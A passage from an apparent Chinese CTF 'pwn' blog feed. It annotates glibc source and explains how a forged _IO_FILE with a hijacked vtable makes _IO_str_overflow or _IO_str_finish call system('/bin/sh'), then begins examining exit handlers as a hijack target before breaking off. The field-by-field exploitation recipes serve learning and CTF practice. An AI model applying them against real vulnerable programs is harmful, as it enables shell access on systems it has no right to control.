<span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h5 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h5><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h5 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h5><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h4 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li></ol>]]></content>
    
    
    <summary type="html">IO_FILE初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>exit函数利用</title>
    <link href="https://ixout.github.io/posts/11890/"/>
    <id>https://ixout.github.io/posts/11890/</id>
    <published>2023-04-05T03:00:01.000Z</published>
    <updated>2023-04-08T03:26:43.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码2-27"><a href="#源码2-27" class="headerlink" title="源码2.27"></a>源码2.27</h1><p>先看两个exit.h中的重要结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>         //一个联合体<span class="title">func</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);   <span class="comment">//ef_at类型 没有参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);   <span class="comment">//ef_on类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>    </span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status); <span class="comment">//ef_cxa类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个exit_function_list,单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;   <span class="comment">//记录有多少个函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span>  <span class="comment">//exit_function数组,析构函数数组</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>首先是exit的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>libc经典的套娃函数,可以看出exit的主体是__run_exit_handlers</p><p>run_exit_handlers()的主要工作就是<strong>调用exit_funcs中保存的各种函数指针</strong></p><p>看其工作流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用atexit与on_exit注册的函数，顺序为注册的逆序</span></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//首先释放线程局部储存, 即TLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__call_tls_dtors();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历exit_fundtion_list链表，链表种每个节点里又有一个函数指针数组，根据里面的函数类型进行调用</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp; <span class="comment">//cur指向当前exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cur-&gt;idx表示cur-&gt;fns中有多少个函数，从后往前遍历</span></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) <span class="comment">//遍历exit_function_list节点中 析构函数数组fns[32]中的函数指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx]; <span class="comment">//f指向对应析构函数的描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor) <span class="comment">//选择析构函数类型</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//三种函数指针</span></span><br><span class="line">    <span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两种类型不调用</span></span><br><span class="line">  <span class="keyword">case</span> ef_free:</span><br><span class="line">  <span class="keyword">case</span> ef_us:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//on类型的参数为注册时设定的参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_on:</span><br><span class="line">    onfct = f-&gt;func.on.fn; <span class="comment">//设置函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    onfct(status, f-&gt;func.on.arg); <span class="comment">//调用这个函数指针</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//at没有参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_at:</span><br><span class="line">    atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    atfct();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cxa类型则先为设定时的参数，再为状态码</span></span><br><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cxafct(f-&gt;func.cxa.arg, status); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//listp指向下一个exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个链表节点为libc .data段中的initial，不需要释放</span></span><br><span class="line"><span class="comment">//除此以外的节点都是malloc申请得到的, 所以需要释放</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//真正的exit系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考1-能否劫持-exit-funcs数组"><a href="#思考1-能否劫持-exit-funcs数组" class="headerlink" title="思考1:能否劫持__exit_funcs数组?"></a>思考1:能否劫持__exit_funcs数组?</h2><p>在exit调用<strong>run_exit_handlers()时下断点, 找到</strong>exit_funcs指针</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_165633.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_170143.png" alt=""></p><p>可以看到其中最重要的fns[0]被加密成乱码了,要想利用的话还要获得存储在fs:0x30的密钥,难度高,几乎难以利用</p><h2 id="exit-funcs如何添加析构函数"><a href="#exit-funcs如何添加析构函数" class="headerlink" title="__exit_funcs如何添加析构函数()"></a>__exit_funcs如何添加析构函数()</h2><p>既然难以攻击<strong>exit_funcs, 那么尝试从</strong>exit_funcs中的函数入手</p><p>我们首先要弄明白, __exit_funcs中的函数是怎么添加的</p><p>libc提供了一个接口: atexit()用来注册exit()时调用的析构函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DSO由GCC定义，用来识别模块的*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *__dso_handle __attribute__((__weak__));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册一个exit时调用的析构函数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cxa_atexit()是对internal_atexit()的封装</p><p>注意: __exit_funcs就是exit()时用的那个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册一个exit/共享库被卸载时调用的函数，只会被C++编译器生产的代码调用，C会通过atexit调用</span></span><br><span class="line"><span class="type">int</span> __cxa_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit(func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__cxa_atexit)</span><br></pre></td></tr></table></figure><p><strong>internel_atexit()通过</strong>new_exitfn()找到一个在__exit_funcs链表上注册析构函数的位置, 然后进行写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  参数:</span></span><br><span class="line"><span class="comment">    - func  析构函数指针</span></span><br><span class="line"><span class="comment">    - arg   参数指针</span></span><br><span class="line"><span class="comment">    - d     DSO</span></span><br><span class="line"><span class="comment">    - listp 析构函数数组链表指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> attribute_hidden __internal_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d, <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span> =</span> __new_exitfn(listp); <span class="comment">//先在__exit_funcs链表上添加一个描述析构函数的结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE(func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后设置分配到的这个结构体</span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*)(<span class="type">void</span> *, <span class="type">int</span>))func; <span class="comment">//函数指针</span></span><br><span class="line">  new-&gt;func.cxa.arg = arg;                        <span class="comment">//参数</span></span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  atomic_write_barrier();</span><br><span class="line">  new-&gt;flavor = ef_cxa;                         <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__new_exitfn()的逻辑大致为</p><ul><li>先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲</li><li>如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体</li><li>设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从listp上返回一个新的exit_function结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *__<span class="title">new_exitfn</span>(<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock(lock); <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找一个析构函数类型为ef_free的位置</span></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next) <span class="comment">//遍历链表，l指向当前节点, p指向l的前一个节点</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)           <span 